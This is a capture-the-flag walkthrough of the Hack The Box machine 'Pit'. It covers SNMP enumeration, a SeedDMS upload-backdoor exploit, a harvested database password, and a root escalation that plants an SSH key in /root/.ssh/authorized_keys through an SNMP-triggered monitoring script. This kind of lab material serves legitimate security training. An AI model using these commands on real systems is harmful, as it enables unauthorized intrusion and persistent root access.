# Pit

- Target Machine: 10.10.10.241

## Enumeration

### nmap scan

```bash
Nmap scan report for 10.10.10.241
Host is up, received syn-ack (0.064s latency).
Scanned at 2021-09-13 10:36:14 CEST for 204s
Not shown: 980 filtered tcp ports (no-response), 17 filtered tcp ports (host-unreach)
PORT     STATE SERVICE         REASON  VERSION
22/tcp   open  ssh             syn-ack OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 6f:c3:40:8f:69:50:69:5a:57:d7:9c:4e:7b:1b:94:96 (RSA)
|   ssh-rsa AAAA...
|   256 c2:6f:f8:ab:a1:20:83:d1:60:ab:cf:63:2d:c8:65:b7 (ECDSA)
| ecdsa-sha2-n....
|   256 6b:65:6c:a6:92:e5:cc:76:17:5a:2f:9a:e7:50:c3:50 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJmDbvdFwHALNAnJDXuRD6aO9yppoVnKbTLbUmn6CWUn
80/tcp   open  http            syn-ack nginx 1.14.1
|_http-server-header: nginx/1.14.1
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: Test Page for the Nginx HTTP Server on Red Hat Enterprise Linux
9090/tcp open  ssl/zeus-admin? syn-ack
| ssl-cert: Subject: commonName=dms-pit.htb/organizationName=4cd9329523184b0ea52ba0d20a1a6f92/countryName=US
| Subject Alternative Name: DNS:dms-pit.htb, DNS:localhost, IP Address:127.0.0.1
| Issuer: commonName=dms-pit.htb/...
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-04-16T23:29:12
| Not valid after:  2030-06-04T16:09:12
| MD5:   0146 4fba 4de8 5bef 0331 e57e 41b4 a8ae
| SHA-1: 29f2 edc3 7ae9 0c25 2a9d 3feb 3d90 bde6 dfd3 eee5
```

A normal nmap scan reveal a `nginx` server on port 80 and a `CentOS Web Console` hosted on port 9090, which also has the DNS alias of `dms-pit.htb`, which however redirects us to the ngnix 403 page.

Sadly, there isn't much we can do with the two found services, since their versions dont't seem to have common exploitable vulnerabilities. All we could do is bruteforce the CentOS login page, but that would be a waste of time.

## Second nmap scan

A full port scan reveals nothing else, so all that we have left is an UDP scan, which indeed reveals to be useful.

```
# Nmap 7.92SVN scan initiated Mon Sep 13 11:46:53 2021 as: nmap -sU -oA nmap/udp_scan -vv 10.10.10.241
Increasing send delay for 10.10.10.241 from 800 to 1000 due to 11 out of 23 dropped probes since last increase.
Nmap scan report for 10.10.10.241
Host is up, received echo-reply ttl 63 (0.045s latency).
Scanned at 2021-09-13 11:47:07 CEST for 997s
Not shown: 999 filtered udp ports (admin-prohibited)
PORT    STATE SERVICE REASON
161/udp open  snmp    udp-response ttl 63

Read data files from: /usr/local/bin/../share/nmap
# Nmap done at Mon Sep 13 12:03:45 2021 -- 1 IP address (1 host up) scanned in 1011.31 seconds
```

## snmpwalk scan

As we can see, there is a SNMP server hosted on port 161/udp. First, we need to add pit.htb on the /etc/hosts file, then we can run `snmpwalk -On -c public -r1 -v2c pit.htb 1 | tee snmpwalk/walk.log` to scan the service. This action will take a long time and a lot of the output in the file will be useless data. 
To filter it, we can use vscode replace function with regex enabled and remove the lines matching any of the following expressions: `[\.\d*]+ = OID: .0.0\n`, `[\.\d*]+ = INTEGER: \w+\(\d\)\n`, `[\.\d*]+ = ""\n`, `[\.\d*]+ = INTEGER: \d+\n`

Now that the output is way more readable, we can find some interesting data:

```log
.1.3.6.1.4.1.2021.9.1.2.1 = STRING: /
.1.3.6.1.4.1.2021.9.1.2.2 = STRING: /var/www/html/seeddms51x/seeddms
.1.3.6.1.4.1.2021.9.1.3.1 = STRING: /dev/mapper/cl-root
.1.3.6.1.4.1.2021.9.1.3.2 = STRING: /dev/mapper/cl-seeddms
    .
    .
    .
.1.3.6.1.4.1.8072.1.3.2.2.1.2.10.109.111.110.105.116.111.114.105.110.103 = STRING: /usr/bin/monitor
.1.3.6.1.4.1.8072.1.3.2.2.1.3.10.109.111.110.105.116.111.114.105.110.103 = STRING: 
.1.3.6.1.4.1.8072.1.3.2.2.1.4.10.109.111.110.105.116.111.114.105.110.103 = STRING: 
.1.3.6.1.4.1.8072.1.3.2.2.1.7.10.109.111.110.105.116.111.114.105.110.103 = INTEGER: run-on-read(1)
.1.3.6.1.4.1.8072.1.3.2.3.1.1.10.109.111.110.105.116.111.114.105.110.103 = STRING: Memory usage
.1.3.6.1.4.1.8072.1.3.2.3.1.2.10.109.111.110.105.116.111.114.105.110.103 = STRING: Memory usage
              total        used        free      shared  buff/cache   available
Mem:          3.8Gi       617Mi       2.8Gi       8.0Mi       435Mi       3.0Gi
Swap:         1.9Gi          0B       1.9Gi
Database status
OK - Connection to database successful.
System release info
CentOS Linux release 8.3.2011
SELinux Settings
user

                Labeling   MLS/       MLS/                          
SELinux User    Prefix     MCS Level  MCS Range                      SELinux Roles

guest_u         user       s0         s0                             guest_r
root            user       s0         s0-s0:c0.c1023                 staff_r sysadm_r system_r unconfined_r
staff_u         user       s0         s0-s0:c0.c1023                 staff_r sysadm_r unconfined_r
sysadm_u        user       s0         s0-s0:c0.c1023                 sysadm_r
system_u        user       s0         s0-s0:c0.c1023                 system_r unconfined_r
unconfined_u    user       s0         s0-s0:c0.c1023                 system_r unconfined_r
user_u          user       s0         s0                             user_r
xguest_u        user       s0         s0                             xguest_r
login

Login Name           SELinux User         MLS/MCS Range        Service

__default__          unconfined_u         s0-s0:c0.c1023       *
michelle             user_u               s0                   *
root                 unconfined_u         s0-s0:c0.c1023       *
```

As we can see, the target machine has some files in the `/var/www/html/seeddms51x/seeddms` folder. Also, we found an user named `michelle` and an interesting file in `/usr/bin/monitor` being called by the SNMP service with the flag __run on read__.

## Exploiting the SeedDMS service

Since the seeddms folder was found by the last scan, it means that it's publicly accessible. We can try to access using the found DNS alias (http://dms-pit.htb/seeddms51x/seeddms), getting redirected to a login page where we can login using `michelle:michelle` as credentials.

Searching on ExploitDB, we find out that this software had a [vulnerability](https://www.exploit-db.com/exploits/47022) where we can easily upload a file with our own custom made backdoor.
__ATTENTION__: while using this exploit, use `http://dms-pit.htb/seeddms51x/` as the base directory or you wont be able to run the backdoor.

After veryfing that we have reached RCE, we can use the BurpSuite repeater to easily run commands. However, we have limited actions that we're allowed to use.

Using cat, we `ls` and `cat`, we can output the contents of the file `../../../conf/settings.xml`, which contains the following XML line:

```xml
    <database dbDriver="mysql" dbHostname="localhost" dbDatabase="seeddms" dbUser="seeddms" dbPass="ied^ieY6xoquu" doNotCheckVersion="false">
    </database>
    <!-- smtpServer: SMTP Server hostname
       - smtpPort: SMTP Server port
       - smtpSendFrom: Send from
    -->    
```

We can now try to access the SQLite server using [Impacket's mssqlclient](https://github.com/SecureAuthCorp/impacket.git), but it doesn't seem to be able to respond.

Going back to the CentOS login screen, we can try to access with out new credentials.
`michelle:ied^ieY6xoquu` seems to do the trick. Once logged in, we can open the terminal page and find the flag in the home directory.

## Priviledge escalation

Taking a step back, we can search for the file in `/usr/bin/monitor` found in the SNMPwalk. 

```bash
[michelle@pit shm]$ ls -la  /usr/bin/monitor
-rwxr--r--. 1 root root 88 Apr 18  2020 /usr/bin/monitor

[michelle@pit shm]$ cat /usr/bin/monitor
#!/bin/bash

for script in /usr/local/monitoring/check*sh
do
    /bin/bash $script
done
[michelle@pit shm]$

[michelle@pit shm]$ cd /usr/local/monitoring

[michelle@pit monitoring]$ ls
ls: cannot open directory '.': Permission denied

[michelle@pit monitoring]$ touch test

[michelle@pit monitoring]$ 
```

As we can see, the monitor script runs every script mathcing the `check*.sh` wildcard in the directory `/usr/local/monitoring/`. However, it looks like we can't see this directory's contents but we can still create a file using `touch`. This means that we could simply run `echo {PAYLOAD} > check_exploit.sh` and then use again SNMPwalk to run the service, which will then execute our payload.

We could spawn a simple revshell, however it looks like once we run `cat /root/root.txt` we don't get an output, which means that probably we don't have read permissions but maybe we still have write persissions, meaning we could still inject our own SSH key into root's SSH authorized keys, enabling us to login as root.

```bash
# AS MICHELLE
[michelle@pit monitoring]$ echo "echo \"{YOUR_SSH_PUB_KEY}\" >> /root/.ssh/authorized_keys" > check_ssh_backdoor.sh

# ON YOUR MACHINE
[exyss@exyss .ssh]$ snmpwalk -c public -v 1 dms-pit.htb 1.3.6.1.4.1.8072.1.3.2.2
NET-SNMP-EXTEND-MIB::nsExtendCommand."monitoring" = STRING: /usr/bin/monitor
NET-SNMP-EXTEND-MIB::nsExtendArgs."monitoring" = STRING: 
NET-SNMP-EXTEND-MIB::nsExtendInput."monitoring" = STRING: 
NET-SNMP-EXTEND-MIB::nsExtendCacheTime."monitoring" = INTEGER: 5
NET-SNMP-EXTEND-MIB::nsExtendExecType."monitoring" = INTEGER: exec(1)
NET-SNMP-EXTEND-MIB::nsExtendRunType."monitoring" = INTEGER: run-on-read(1)
NET-SNMP-EXTEND-MIB::nsExtendStorage."monitoring" = INTEGER: permanent(4)
NET-SNMP-EXTEND-MIB::nsExtendStatus."monitoring" = INTEGER: active(1)

[exyss@exyss .ssh]$ ssh -i id_rsa root@10.10.10.241
Enter passphrase for key 'id_rsa': 
Web console: https://pit.htb:9090/

Last login: Mon Jul 26 06:58:15 2021
[root@pit ~]#
```
